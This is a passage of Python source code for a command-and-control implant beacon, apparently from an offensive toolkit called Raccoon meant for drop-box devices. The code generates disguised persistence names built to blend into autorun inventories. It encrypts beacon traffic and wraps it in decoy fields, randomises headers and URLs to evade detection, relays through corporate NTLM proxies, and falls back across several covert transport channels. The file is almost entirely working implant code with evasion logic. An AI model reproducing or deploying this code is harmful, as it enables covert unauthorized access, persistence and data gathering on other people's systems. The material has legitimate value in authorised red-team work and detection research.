    keys = random.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


# ── Persistence names ──
#
# One name per build, generated rather than fixed. The HKCU `Run` value
# and the scheduled task used to be one literal written identically in
# every deployment, so a single burned engagement burned the name for
# every deployment that followed it.
#
# Ordinary administrative vocabulary on purpose: the only place this name
# is ever read is an autorun inventory, where the thing that draws an eye
# is a name that belongs to nothing. The trailing hex is what makes two
# builds differ -- two words alone would collide across an engagement.
_PERSIST_WORDS = ("Device", "Display", "Network", "Printer", "Credential",
                  "Policy", "Session", "Storage", "Telemetry", "Update")
_PERSIST_ROLES = ("Host", "Agent", "Broker", "Helper", "Manager", "Service",
                  "Sync", "Worker")


def persistence_name(entropy: bytes) -> str:
    """One build's autorun entry name, derived from `entropy`.

    Two callers, one shape. The generator passes `os.urandom`, so every
    build it issues carries its own name in its config block. `Beacon`
    passes bytes derived from its implant id when a config carries no
    persistence block at all, because that answer has to be the same on
    every run of one artifact on one host -- otherwise an `unpersist`
    would go looking for a name no `persist` ever wrote.

    Four bytes at least. A caller with fewer thought it was passing
    something random and was not, and the name it would get back would be
    the same one every other such caller got.
    """
    if len(entropy) < 4:
        raise ValueError(
            "persistence_name needs at least 4 bytes of entropy, got %d: "
            "fewer than that is not a per-build name" % len(entropy))
    return "%s%s%s" % (_PERSIST_WORDS[entropy[0] % len(_PERSIST_WORDS)],
                       _PERSIST_ROLES[entropy[1] % len(_PERSIST_ROLES)],
                       entropy[2:4].hex())


# ── The gsocket leg's own copies ──
#
# Copied from `software/c2/gsocket/config.py`'s `LEG_DEFAULTS` and from
# `carrier.py`, not imported: this file is served to a target as source
# text and may import only the standard library. `test_gsocket_leg.py`
# compares both copies against their originals, the way
# `test_dns_rescue.py` compares the rescue format's.
#
# `scheme` is "http" and not "https" because `server.py`'s `--ssl` is off
# by default and every shipped `relay_url` is `http://127.0.0.1:8443`.
# Confidentiality on that hop rests on the SRP/AES-256 session gsocket
# negotiates end to end and on the AES-256-GCM envelope inside it.
#
# `max_restarts: 0` means unlimited, the meaning `c2.sliver.max_restarts`
# already has.
_GSOCKET_DEFAULTS = {
    "scheme": "http",
    "local_port": 16443,
    "restart_delay_seconds": 30,
    "max_restarts": 0,
    "ready_timeout_seconds": 20,
}

# How much of the binary to hash at a time, from `carrier._HASH_CHUNK`.
# An implant is a Raspberry Pi Zero, so the digest is streamed rather
# than slurped.
_GSOCKET_HASH_CHUNK = 1024 * 1024

# How long a single readiness probe may take, and how long to wait between
# two of them. Both are about loopback: the forward is on this host or it
# is nowhere, so a connect that has not answered in a second is not going
# to. The ceiling on the whole wait is `ready_timeout_seconds`.
_GSOCKET_PROBE_TIMEOUT = 1.0
_GSOCKET_READY_POLL = 0.25

# What must not reach the child, from `carrier._child_environment`. A deny
# rule and not an allow list, for the reason that module gives: a variable
# withheld from `gs-netcat` produces a carrier that joins the relay
# network and never finds its peer, which is the one failure here nobody
# can diagnose. `RACCOON_` is a prefix rather than a list so that it still
# covers the next credential variable somebody adds; `GSOCKET_ARGS` is
# named because gsocket's own tools append it to the argv this leg built,
# and the shape it could add includes the `-s <secret>` that would put
# this implant's credential in a world-readable `ps` line.
_GSOCKET_ENVIRONMENT_PREFIX_DENIED = "RACCOON_"
_GSOCKET_ENVIRONMENT_DENIED = frozenset({"GSOCKET_ARGS"})


class Beacon:
    """C2 beacon with AES-GCM encryption and network evasion."""

    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = _clamp_interval(c2.get("beacon_interval_seconds", 300))
        self.jitter = c2.get("jitter_percent", 20) / 100.0

        https_cfg = c2.get("https", {})
        dns_cfg = c2.get("dns", {})
        smb_cfg = c2.get("smb", {})
        quic_cfg = c2.get("quic", {})
        gsocket_cfg = c2.get("gsocket") or {}

        self.https_enabled = https_cfg.get("enabled", False)
        self.callback_url = https_cfg.get("callback_url", "")
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_enabled = dns_cfg.get("enabled", False)
        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        self.smb_enabled = smb_cfg.get("enabled", False)
        self.smb_pipe_name = smb_cfg.get("pipe_name", "msrpc_6e2f")
        self.smb_server = smb_cfg.get("server", "")

        self.quic_enabled = quic_cfg.get("enabled", False)
        self.quic_server = quic_cfg.get("server", "")

        # ── the gsocket leg ──
        #
        # Read the way `smb_cfg` and `quic_cfg` are read, with one
        # difference: this leg runs a child process, so two of its
        # settings have to be usable before anything is spawned.
        #
        # There is no validator here and there must not be one.
        # `gsocket/config.validate_leg` is strict, names every offending
        # value, and lives in a module this file may not import; the team
        # server's startup path already calls it. An inline third copy
        # would be the thing that drifts. So a block that is absent,
        # incomplete or unusable reads as **disabled, with the reason
        # logged once** -- which is how the other four transports already
        # behave, except that they do it silently and a leg with a child
        # process can afford to say why.
        #
        # `binary_path` is the deliberate exception: an absent or empty
        # one is left to `_gsocket_binary_problem`, whose copied reason
        # for exactly that case ("binary_path is empty, so there is
        # nothing for the carrier to exec") is better than anything said
        # here, and whose answer reaches the operator as a
        # `binary_missing` rescue record rather than only as a log line
        # on a host nobody can read.
        # `enabled` is read **by value**, never as `bool(...)`: a
        # `bool("false")` is `True`, and YAML does not unquote a quoted
        # scalar, so `enabled: "false"` would have switched this leg on
        # out of a file that says the opposite. "Everything ships
        # disabled" is a constraint of this project, and this is the one
        # leg whose enabled state is an outbound connection to a third
        # party's relay network -- the one direction in which guessing
        # costs something nobody can take back. `config.validate_leg`
        # refuses such a value by name on the team server; here, where a
        # raised exception would cost the whole beacon, anything that is
        # not the boolean `true` is off and says why once.
        raw_enabled = gsocket_cfg.get("enabled", False)
        self.gsocket_enabled = raw_enabled is True
        if "enabled" in gsocket_cfg and not isinstance(raw_enabled, bool):
            logger.warning(
                "The gsocket leg is off: c2.fallback.gsocket.enabled is %r, "
                "and only the boolean true enables this leg -- an unquoted "
                "true or false is what this setting takes", raw_enabled)
        self.gsocket_secret_file = str(gsocket_cfg.get("secret_file") or "")
        self.gsocket_binary_path = str(gsocket_cfg.get("binary_path") or "")
        # Lower-cased here for the same reason `config._checked_sha256`
        # does it: what it is compared against is a `hexdigest()`, and a
        # digest pasted out of a Windows tool would match nothing --
        # which reads as a replaced binary, the one finding in this
        # feature nobody should get wrong.
        self.gsocket_sha256 = str(gsocket_cfg.get("sha256") or "").strip().lower()
        self.gsocket_scheme = _GSOCKET_DEFAULTS["scheme"]
        self.gsocket_local_port = _GSOCKET_DEFAULTS["local_port"]
        self.gsocket_restart_delay_seconds = \
            _GSOCKET_DEFAULTS["restart_delay_seconds"]
        self.gsocket_max_restarts = _GSOCKET_DEFAULTS["max_restarts"]
        self.gsocket_ready_timeout_seconds = \
            _GSOCKET_DEFAULTS["ready_timeout_seconds"]
        unusable = self._gsocket_settings(gsocket_cfg)
        if self.gsocket_enabled and unusable:
            # Once, at construction, and then the leg is off. The leg is
            # not asked again, because the answer cannot change: nothing
            # rereads the config block.
            logger.warning("The gsocket leg is off: %s", unusable)
            self.gsocket_enabled = False

        # The carrier's child, and what this beacon knows about it. All of
        # it is set up here rather than lazily, so that `_gsocket_stop` on
        # a beacon that never started one has something to read.
        self._gsocket_proc: Optional[subprocess.Popen] = None
        # By the monotonic clock: the readiness window and the restart
        # delay are both durations, and a wall-clock step -- NTP catching
        # up on a drop-box that has been off for a month -- would
        # otherwise make one of them negative.
        self._gsocket_started_at: Optional[float] = None
        # Latched once the forward has accepted a connection. It is what
        # makes the second outage free: a carrier that has been up since
        # the first one is not probed again, because the request about to
        # go through it is the probe.
        self._gsocket_ready_seen = False
        # Spawns, not restarts: the first start is one of these, and
        # `max_restarts` is compared against the ones after it.
        self._gsocket_starts = 0
        # Why this leg has stopped trying, and which rescue class says so.
        # Latched, so the reason is logged once and the expensive half of
        # the binary check -- a SHA-256 of a multi-megabyte file -- is
        # paid once rather than on every cycle.
        self._gsocket_problem = ""
        self._gsocket_problem_class = 0

        self._key = decode_key(c2.get("encryption_key"))

        proxy_cfg = c2.get("proxy", {})
        self.proxy_mode = proxy_cfg.get("mode", "auto")
        self.proxy_url = proxy_cfg.get("url", "")
        self._proxy_ntlm_cfg = proxy_cfg.get("ntlm", {})

        self._proxy = ProxyDiscovery()
        self._proxy_session: Optional[_HttpSession] = None
        self._ntlm_relay: Optional[_NtlmProxyRelay] = None

        self._c2_profile = c2.get("c2_profile", {})

        self._implant_id = self._generate_id()
        self._agent_id: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._registered = False
        self._consecutive_failures = 0
        # Why each leg produced nothing this cycle: transport -> (class,
        # code). Every _beacon_* method already computes this and writes it
        # to a debug log; keeping it is what lets a stuck beacon explain
        # itself over the one channel it has left.
        self._leg_status = {}            # type: Dict[str, Tuple[int, int]]
        self._rescue_flags = 0
        # Armed: set when a rescue goes out, cleared when any leg
        # delivers again. A latch, so there is no rate to detect.
        self._rescue_sent = False
        # Whether that rescue brought back something to do. The team
        # server answering means it is reachable and deciding, which is
        # the decider's reason to stand down -- for the rest of the
        # window, since the rescue is one query per window and the answer
        # it carried is the instruction for all of it. An *empty* answer
        # is not one: the DNS tasking route replies with an encrypted {}
        # even when the queue is empty, on purpose, and "the rescue
        # brought nothing back" is the cycle the decider exists for.
        self._rescue_answered = False

        # ── the way out ──
        #
        # `c2.way_out` is already read: `beacon_config_from_fallback` put
        # `read_way_out_policy`'s answer here, exactly as it puts the
        # decider's. A generated build has no such key, which is this
        # feature's distribution rule rather than an oversight.
        #
        # The scout is a different process -- `raccoon-implant.service`
        # runs `main.py` and this runs under `raccoon-beacon.service` --
        # so the two meet over files under `state_dir`. Everything below is
        # inert while `enabled` is false, which is how this ships, and the
        # directory is emptied with it so that nothing can be written by a
        # reader which forgot to ask.
        #
        # Read **before** the decider's block, because `_egress_usable`
        # consults `_way_out_enabled`: a rule naming a flag only the scout
        # sets can never match on a build with no scout, and that is said
        # when the policy is read rather than on a stuck cycle.
        way_out = c2.get("way_out") or {}
        self._way_out = dict(_WAY_OUT_DEFAULTS)
        self._way_out["model"] = dict(_WAY_OUT_MODEL_DEFAULTS)
        self._way_out.update(way_out)
        self._way_out_enabled = way_out.get("enabled") is True
        self._way_out_state_dir = (self._way_out.get("state_dir") or ""
                                   if self._way_out_enabled else "")
        # The radio rung's leased address, while it holds one: every
        # socket this implant opens is bound to it, which is what makes
        # the rung's `ip rule from <address>` match. Cleared by a
        # rollback, and **not** by a leg delivering -- see
        # `_leg_recovered` for why that was a defect. `_bound_session` is
        # the one place that reads it.
        self._way_out_source = ""
        # Rung 4's latch, as this process remembers it. Once per
        # deployment, and deliberately **not** reset by `_leg_recovered`:
        # it is the one move here that cannot be undone from the far side,
        # so a second outage does not get a second attempt at it.
        # Re-arming it is a new deployment.
        #
        # The memory is not the latch, though, and that was the defect:
        # this unit carries `Restart=always`, so a flag that started at
        # False re-armed the one move the operator page says in bold can
        # end this implant's connectivity for good, on every restart.
        # `_egress_identity` reads the request file it wrote -- the
        # durable record, the same way `_way_out_publish_state` adopts a
        # window's spent budget rather than refilling it -- and this flag
        # is what still refuses when that write could not be made at all.
        self._way_out_identity_spent = False

        # ── the egress decider ──
        #
        # The policy is already read: `beacon_config_from_fallback` put
        # `read_egress_policy`'s answer here, exactly as it puts
        # `tunnel_config_from_yaml`'s at `c2.tunnel`. A generated build
        # has no such key at all, which is this feature's distribution
        # rule rather than an oversight -- `configs/raccoon.yaml` never
        # reaches a target host, so there is nothing there to read.
        #
        # Nothing re-reads the block. The normalised shape would not
        # survive a second pass -- a refused policy's budget is 0, which
        # the reader refuses by design -- and a second reading would be a
        # second place where a policy is judged.
        policy = c2.get("egress_decider") or {}
        self._egress_enabled = policy.get("enabled") is True
        # Read by value, as the gsocket leg's `enabled` is and for the
        # same reason: this setting is the whole difference between an
        # implant that acts on its own and one that does not, and
        # `bool("false")` is True.
        #
        # `budget` and `rules` only when it is on, which is the reader's
        # contract: the shipped block is disabled *and* carries rules, so
        # taking them regardless would be reading a draft as permission.
        self._egress_budget = 0
        self._egress_rules = []     # type: List[Tuple[int, dict]]
        if self._egress_enabled:
            self._egress_budget = policy.get("budget") or 0
            self._egress_rules = self._egress_usable(policy.get("rules") or [])
        # Consecutive cycles on which no upstream leg delivered, and what
        # this stuck window has spent of its budget. The decider may not
        # act on the first of those cycles -- the operator's decision, and
        # `_egress_act` is where it is kept -- and both of these reset
        # together with the rescue latch when a leg delivers, in
        # `_leg_recovered`.
        self._stuck_cycles = 0
        self._egress_spent = 0

        # The tunnel endpoint runs in its own process, not a thread: the
        # beacon is the access and the tunnel is the convenience, so a
        # hung or crashed tunnel must not be able to take the beacon with
        # it. One child at a time, and the record outlives the child so a
        # check-in can confirm a stop and report a crash.
        self._tunnel_proc: Optional[subprocess.Popen] = None
        self._tunnel_origin = ""
        # Retained so `tunnel start` can refuse before it spawns. The
        # child's own refusal goes to a stderr this process sends to
        # DEVNULL, so without this the operator's whole diagnosis is
        # `exit_code: 1` at the next check-in.
        self._tunnel_cfg = c2.get("tunnel")
        # Why there is no block, when a config file had one this host
        # could not use. `tunnel_mode_problem` cannot tell that case from
        # a build generated without a tunnel, and its answer for the
        # latter -- "generate the build with the tunnel enabled" -- is
        # advice nobody can act on when the tunnel came from
        # `configs/raccoon.yaml`. See `beacon_config_from_fallback`.
        self._tunnel_problem = c2.get("tunnel_problem") or ""
        # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
        # thread owns the process, so the two meet over this.
        self._tunnel_lock = threading.Lock()

        # Persistence: one generated name per build, carried in the config
        # block, so `_exec_persist` and `_exec_unpersist` read one value
        # rather than each holding its own copy of a literal. The name an
        # install wrote is by construction the name a removal looks for.
        persist_cfg = c2.get("persistence") or {}
        # No block means a config file rather than a generated build.
        # Derived from the implant id, which is stable for the life of a
        # host, and not from a literal -- a literal here would be the
        # thing this field exists to remove. The id is `_generate_id`'s
        # hex digest, so its own bytes are the entropy: beacon.py's hash
        # call sites are an allow-list in the hardening tests, on purpose,
        # and a name needs no hash of its own.
        self._persist_name = persist_cfg.get("name") or persistence_name(
            bytes.fromhex(self._implant_id[:8]))
        # `path` keeps the payload's path on the autorun command line;
        # `argc` leaves it off and lets the hook in a brought
        # interpreter's own `Lib/` find the payload. Anything else is a
        # build from a newer generator than this artifact, and `path` is
        # the answer that still works without a hook. See
        # `render_sitecustomize` in `software/c2/stagers/startup_hook.py`
        # for why `path` is the default rather than the quieter-looking
        # one.
        gate = persist_cfg.get("gate")
        self._persist_gate = gate if gate in ("path", "argc") else "path"
        self._persist_payload = persist_cfg.get("payload_name") or ""

        # A launcher that runs on the drop-box says so; the Raccoon config on
        # disk is the independent second signal (see _probe_dropbox).
        self._dropbox_hint = bool(c2.get("dropbox", False))
        # Read once: check-ins must not walk sysfs and the routing table.
        self._caps = self._detect_caps()
        self._uplink_iface = self._detect_uplink_iface()

    # ── Identity ──

    def _generate_id(self) -> str:
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ── Crypto ──

    def _encrypt(self, data: dict) -> str:
        # The parameter is a dict and nothing else. Three callers used to
        # hand this an already-serialised value, and both ways of being
        # wrong were invisible: bytes raised TypeError from inside
        # json.dumps and the caller's `except` discarded it, so the SMB and
        # QUIC transports never put a byte on the wire; a str would have
        # been serialised a second time, and the far side would have
        # decrypted a string where it expected a dict, with no error
        # anywhere. The type hint said dict all along -- this makes it true
        # at the boundary, so a future caller finds out immediately.
        # The message names the type and never the value: the argument is
        # plaintext about to be encrypted.
        if not isinstance(data, dict):
            raise TypeError(
                "_encrypt(data) takes a dict, not %s -- pass the mapping, "
                "not a serialised form of it" % type(data).__name__)
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = _aes_gcm_decrypt(self._key, nonce, ct)
        return json.loads(plaintext)

    # ── Evasion helpers ──

    def _evasive_url(self, endpoint: str, base: Optional[str] = None) -> str:
        """One request's URL, under the active C2 profile.

        `base` lets a caller aim the same profile at a different socket.
        The default is the parent of the callback URL, which is what this
        did unconditionally before the gsocket leg existed, so every
        existing caller is unchanged. That leg passes the near end of its
        own forward -- and the profile applying inside the pipe too is
        correct, because the far end of it is the same beacon socket.
        """
        if base is None:
            base = self.callback_url.rsplit("/", 1)[0]
        profile_block = self._c2_profile.get(
            "http_post" if endpoint == "result" else "http_get", {})
        uris = profile_block.get("uris", [])
        if uris:
            uri = random.choice(uris).lstrip("/")
            return f"{base}/{uri}"
        suffix = random.choice(_URL_SUFFIXES)
        ts = int(time.time() * 1000)
        qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
        return f"{base}/{endpoint}{suffix}{qp}"

    def _evasive_headers(self) -> dict:
        profile_block = self._c2_profile.get("http_get", {})
        if profile_block.get("headers") or self._c2_profile.get("useragent"):
            headers = {}
            ua = self._c2_profile.get("useragent", "")
            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
            headers["Content-Type"] = "application/json"
            for name, value in profile_block.get("headers", {}).items():
                headers[name] = value
            for name, value in profile_block.get("params", {}).items():
                pass
            return headers
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
            "Content-Type": "application/json",
        }
        extra_keys = random.sample(
            list(_EXTRA_HEADERS.keys()),
            random.randint(2, min(4, len(_EXTRA_HEADERS))),
        )
        for k in extra_keys:
            headers[k] = random.choice(_EXTRA_HEADERS[k])
        return headers

    def _post_headers(self) -> dict:
        profile_block = self._c2_profile.get("http_post", {})
        if profile_block.get("headers") or self._c2_profile.get("useragent"):
            headers = {}
            ua = self._c2_profile.get("useragent", "")
            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
            headers["Content-Type"] = "application/json"
            for name, value in profile_block.get("headers", {}).items():
                headers[name] = value
            return headers
        return self._evasive_headers()

    def _wrap_payload(self, data: dict) -> dict:
        encrypted = self._encrypt(data)
        field = random.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(random.randint(4, 10)))
        return dict(sorted(payload.items()))

    def _unwrap_response(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self._decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self._decrypt(v)
                except Exception:
                    continue
        return None

    # ── Capabilities ──

    def _detect_caps(self) -> list:
        """Capabilities advertised to the C2. Never raises: a beacon with an
        incomplete list is better than one that cannot start."""
        caps = ["batch", "smbloot",
                "windows" if platform.system() == "Windows" else "posix"]
        for probe in (self._probe_dropbox, self._probe_sniffer,
                      self._probe_wifi):
            try:
                caps.extend(probe())
            except Exception as e:
                logger.debug("Capability probe %s failed: %s", probe.__name__, e)
        return caps

    @staticmethod
    def _raccoon_config_paths() -> list:
        from software.c2.beacon_standalone import CONFIG_PATHS
        return list(CONFIG_PATHS)

    def _probe_dropbox(self) -> list:
        # The launcher's word counts even if the config lookup below fails.
        if self._dropbox_hint:
            return ["dropbox"]
        # A Raccoon config on disk is what makes a host a drop-box.
        if any(Path(p).exists() for p in self._raccoon_config_paths()):
            return ["dropbox"]
        return []

    def _configured_capture_dir(self) -> Optional[str]:
        import yaml
        for p in self._raccoon_config_paths():
            if Path(p).exists():
                with open(p) as f:
                    cfg = yaml.safe_load(f) or {}
                return (cfg.get("sniffer") or {}).get("capture_dir") or None
        return None

    def _probe_sniffer(self) -> list:
        capture_dir = getattr(self, "capture_dir", None)
        if not capture_dir:
            capture_dir = self._configured_capture_dir()
        if not capture_dir or not Path(capture_dir).is_dir():
            return []
        # The sniffer writes into one subdirectory per capture profile, and
        # may leave only encrypted (.pcap.gpg) files behind.
        if next(Path(capture_dir).rglob("*.pcap*"), None) is not None:
            return ["sniffer"]
        return []

    def _probe_wifi(self) -> list:
        caps = []
        for name in sorted(os.listdir(_SYSFS_NET)):
            iface = os.path.join(_SYSFS_NET, name)
            if not os.path.exists(os.path.join(iface, "wireless")):
                continue
            if "wifi:scan" not in caps:
                caps.append("wifi:scan")
            driver = os.path.join(iface, "device", "driver")
            if (os.path.exists(driver)
                    and os.path.basename(os.path.realpath(driver))
                    in _MONITOR_DRIVERS):
                caps.append("wifi:monitor")
                break
        return caps

    def _detect_uplink_iface(self) -> Optional[str]:
        """Interface carrying the default route, or None when unsure.

        None makes the safety layer refuse every monitor-mode switch, which
        is safe; a wrong answer could let it cut its own channel. So an
        ambiguous table is reported as None rather than guessed at.
        """
        try:
            if platform.system() == "Windows":
                return self._uplink_from_route_print()
            return self._uplink_from_proc_route()
        except Exception as e:
            logger.debug("Uplink detection failed: %s", e)
            return None

    @staticmethod
    def _lowest_metric_iface(candidates: list) -> Optional[str]:
        if not candidates:
            return None
        best = min(m for m, _ in candidates)
        ifaces = {i for m, i in candidates if m == best}
        return ifaces.pop() if len(ifaces) == 1 else None

    def _uplink_from_proc_route(self) -> Optional[str]:
        candidates = []
        with open(_PROC_NET_ROUTE) as f:
            next(f, None)
            for line in f:
                cols = line.split()
                if len(cols) < 8:
                    continue
                iface, dest, flags, metric, mask = (
                    cols[0], cols[1], cols[3], cols[6], cols[7])
                if dest != "00000000" or mask != "00000000":
                    continue
                try:
                    flags_v, metric_v = int(flags, 16), int(metric)
                except ValueError:
                    continue
                # RTF_UP set, RTF_REJECT clear
                if not flags_v & 0x1 or flags_v & 0x200:
                    continue
                candidates.append((metric_v, iface))
        return self._lowest_metric_iface(candidates)

    def _uplink_from_route_print(self) -> Optional[str]:
        # Windows reports the interface by address, not by name, and the
        # router compares this value against interface *names*. An address
        # would therefore never match, so the safety layer would believe the
        # uplink is known and allow a monitor-mode switch on it — the exact
        # failure "no uplink known" exists to prevent, since that case
        # refuses every switch instead.
        #
        # So: nothing is reported here. Correlating the address back to a
        # name needs a second command, on a platform where the monitor-mode
        # path does not exist at all, so the conservative answer costs
        # nothing and the permissive one costs the channel.
        return None

    # ── System info ──

    def _system_info(self) -> dict:
        info = {
            "id": self._implant_id,
            "agent_id": self._agent_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "uptime": self._get_uptime(),
            "interval": self.interval,
            "local_ips": self._get_local_ips(),
            "proxy_mode": self.proxy_mode,
            "caps": list(self._caps),
            "uplink_iface": self._uplink_iface,
        }
        if self._ntlm_relay:
            # Report the real upstream, not the local relay port — the operator
            # cares about which corporate proxy the traffic exits through.
            info["proxy_active"] = f"{self._ntlm_relay.upstream_url} (NTLM: {self._ntlm_relay.identity})"
        elif self._proxy._active_proxy:
            info["proxy_active"] = self._proxy._active_proxy["url"]
        elif self._proxy_session and self._proxy_session.proxies:
            info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")

        # Only when this beacon has started a tunnel child, so the check-in
        # payload of every build that has no tunnel is byte for byte what
        # it was. A child that has died is reported rather than forgotten:
        # that is the only signal an operator gets for a tunnel that
        # crashed, and it is what confirms a stop they asked for.
        tunnel = self._tunnel_status()
        if tunnel is not None:
            info["tunnel"] = tunnel

        if self._c2_profile:
            p = self._c2_profile
            prof: dict = {"active": True}
            if p.get("useragent"):
                prof["useragent"] = p["useragent"]
            get_b = p.get("http_get", {})
            post_b = p.get("http_post", {})
            if get_b.get("uris"):
                prof["get_uris"] = get_b["uris"]
            if post_b.get("uris"):
                prof["post_uris"] = post_b["uris"]
            if get_b.get("headers"):
                prof["get_headers"] = list(get_b["headers"].keys())
            if post_b.get("headers"):
                prof["post_headers"] = list(post_b["headers"].keys())
            if get_b.get("metadata"):
                prof["metadata_config"] = get_b["metadata"]
            if post_b.get("id"):
                prof["id_config"] = post_b["id"]
            prof["jitter"] = int(self.jitter * 100)
            prof["interval"] = self.interval
            info["c2_profile"] = prof
        else:
            info["c2_profile"] = {"active": False}
        return info

    @staticmethod
    def _get_local_ips() -> list:
        ips = []
        try:
            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
                addr = info[4][0]
                if addr not in ips and addr != "127.0.0.1":
                    ips.append(addr)
        except Exception:
            pass
        if not ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ips.append(s.getsockname()[0])
                s.close()
            except Exception:
                pass
        return ips

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    # ── Timing ──

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        # Still a floor, because jitter can push a delay below it: at 100%
        # jitter the draw reaches zero. The difference from before is that
        # `self.interval` can no longer be smaller than the floor, so this
        # clamps the jitter and not the operator's setting.
        time.sleep(max(_MIN_INTERVAL, delay))

    def _backoff_sleep(self):
        delay = min(5 * (1.5 ** self._consecutive_failures), 300)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("Backoff %.1fs (failures=%d)", delay, self._consecutive_failures)
        time.sleep(delay)

    # ── HTTPS transport ──

    def _https_post(self, endpoint: str, data: dict,
                    base: Optional[str] = None,
                    transport: str = "https") -> Optional[dict]:
        """POST encrypted payload via proxy-aware session; returns decrypted response or None.

        `base` aims the request somewhere other than the callback URL, and
        `transport` says which leg a failure belongs to. Both exist for
        the gsocket leg, which posts these same payloads through a local
        forward: one HTTP client, and one place where the C2 profile, the
        envelope and the decoy fields are applied, rather than a second
        client that would drift from this one. Without `transport` the
        `_record_leg` calls below would file a carrier's failure against
        HTTPS, and an operator would chase a callback URL that is working
        perfectly.
        """
        session = self._proxy_session or self._bound_session()
        if self._is_loopback_base(base):
            # A forward on this host is never reached through a proxy. The
            # leg that passes a loopback base exists for the network where
            # every other leg failed, and a corporate proxy is the
            # commonest reason for that -- so the one deployment it is for
            # is also the one where a proxied session would hand this
            # request to a proxy that cannot reach `127.0.0.1`, and the
            # leg would never work. `trust_env` off for the same reason:
            # `http_proxy` in the implant's environment would do it too.
            #
            # And bare rather than `_bound_session`, which is the one place
            # that is deliberate: a connection to `127.0.0.1` from the
            # radio rung's leased address cannot be made at all.
            session = _HttpSession()
            session.trust_env = False
        hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
        try:
            resp = session.post(
                self._evasive_url(endpoint, base),
                json_data=self._wrap_payload(data),
                headers=hdrs,
                timeout=30,
            )
            if resp.status_code == 200:
                body = resp.json()
                result = self._unwrap_response(body)
                return result if result else {}
            if resp.status_code == 407:
                logger.warning("Proxy auth required (407) — set proxy credentials in URL")
                self._record_leg(transport, _RESCUE_CLASSES["auth_required"],
                                 407)
            elif resp.status_code != 200:
                self._record_leg(transport, _RESCUE_CLASSES["http_status"],
                                 resp.status_code)
        except _ProxyError as e:
            logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
            # A proxy that exists and refused us is a different situation
            # from no proxy at all, and the operator needs to know which.
            self._rescue_flags |= _RESCUE_FLAG_PROXY_FOUND
            # _ProxyError covers every proxy problem, including one that
            # refused the connection or timed out. Only a 407 means it
            # wants credentials, and that is recorded above where the
            # status code is actually known.
            self._record_leg(transport, _rescue_class_of(e))
            try:
                # Through `_bound_session`, so a retry that bypasses the
                # proxy does not also bypass the radio rung's source bind
                # and leave by the dead tapped port.
                direct = self._bound_session()
                direct.trust_env = False
                resp = direct.post(
                    self._evasive_url(endpoint, base),
                    json_data=self._wrap_payload(data),
                    headers=hdrs,
                    timeout=30,
                )
                if resp.status_code == 200:
                    body = resp.json()
                    result = self._unwrap_response(body)
                    return result if result else {}
            except Exception:
                pass
        except Exception as e:
            logger.debug("HTTPS %s failed: %s", endpoint, e)
            self._record_leg(transport, _rescue_class_of(e))
        return None

    @staticmethod
    def _is_loopback_base(base: Optional[str]) -> bool:
        """Whether `base` names a socket on this host.

        Read off the URL rather than resolved: this is on the request path
        of a leg that exists for hostile networks, and a DNS lookup to
        decide whether to use a proxy is a lookup answered by whoever
        controls the resolver.
        """
        if not base:
            return False
        netloc = base.split("://", 1)[-1].split("/", 1)[0]
        if "@" in netloc:
            netloc = netloc.rsplit("@", 1)[1]
        host = netloc.rsplit(":", 1)[0] if ":" in netloc else netloc
        host = host.strip("[]").lower()
        return host.startswith("127.") or host in ("localhost", "::1")

    def _register_https(self) -> bool:
        info = self._system_info()
        info["action"] = "register"
        return self._adopt_registration(self._https_post("register", info))

    def _adopt_registration(self, answer: Optional[dict]) -> bool:
        """Take the identity the server assigned, and say whether we did.

        An answer counts as a registration only when it carries
        `success`, which is what `_handle_register` replies and what no
        other action replies: a check-in answer is tasking or `{}`, so
        this cannot read an empty queue as an identity.

        It exists because `_agent_id` used to be adopted in
        `_register_https` and nowhere else, while the SMB, QUIC and
        gsocket rungs of `_beacon_loop` promoted `_registered` on their
        own. An implant that registered over any leg but HTTPS therefore
        filed every result afterwards under its *implant* id -- and
        `_handle_result` keys the agent's `history` by the name the
        server assigned, so that work never appeared against the agent at
        all. Registering without adopting the id is half a registration,
        and the fix belongs in one place rather than in four rungs that
        would drift.
        """
        if not (answer and answer.get("success")):
            return False
        self._agent_id = answer.get("agent_id", self._implant_id)
        self._registered = True
        logger.info("Registered as %s", self._agent_id)
        return True

    def _registration_legs(self) -> List[str]:
